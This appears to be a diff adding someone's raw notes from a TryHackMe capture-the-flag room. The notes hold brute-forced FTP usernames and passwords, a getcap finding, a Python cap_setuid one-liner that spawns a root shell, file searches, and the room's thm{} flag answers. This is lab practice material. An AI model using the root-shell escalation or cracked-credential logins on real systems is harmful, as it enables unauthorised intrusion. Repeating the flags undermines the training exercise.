@@ -1,0 +1,77 @@
+
+Tel: +1 (212) 555-4523
+
+Fax: +1 (212) 555-4524
+
+
+/robots.txt
+
+Skiddies keep out.
+Any unauthorised access will be forwarded straight to Richard McGill FBI and you WILL be arrested.
+- plague
+
+
+	
+
+
+[21][ftp] host: 10.10.1.50   login: rcampbell   password: walter
+
+
+
+[21][ftp] host: 10.10.1.50   login: gcrawford   password: mandi
+
+
+
+getcap -r / 2>/dev/null
+/usr/bin/python3.6 = cap_setuid+ep
+/usr/bin/python3.6m = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+
+
+python3 -c "import os, pty; os.setuid(0); pty.spawn('/bin/bash')"
+
+
+
+
+find -name *flag*
+
+
+
+/root/.flag
+thm{b94f8d2e715973f8bc75fe099c8492c4}
+
+/home/tryhackme/.flag
+thm{3ce2fe64055d3b543360c3fc880194f8}
+
+/home/rcampbell/.flag
+thm{12361ad240fec43005844016092f1e05}
+
+/home/productions/.flag
+thm{879f3238fb0a4bf1c23fd82032d237ff}
+
+/var/ftp/.flag
+thm{678d0231fb4e2150afc1c4e336fcf44d}
+
+/home/gcrawford/business.txt
+/etc/ssh/sshd_config
+
+
+
+
+
+grep -rwl "thm" /home
+grep -rwl "thm" /etc
+
+
+
+/home/productions/webserver/resources/main.css
+thm{b63670f7192689782a45d8044c63197f}
+
+
+/etc/vsftpd.conf
+thm{2124a8091b664c98a0e5bdbb7a4fa1cb}
+
+/etc/ssh/sshd_config
+thm{068754683abe0bf81fb621ce55a91964}
+
+
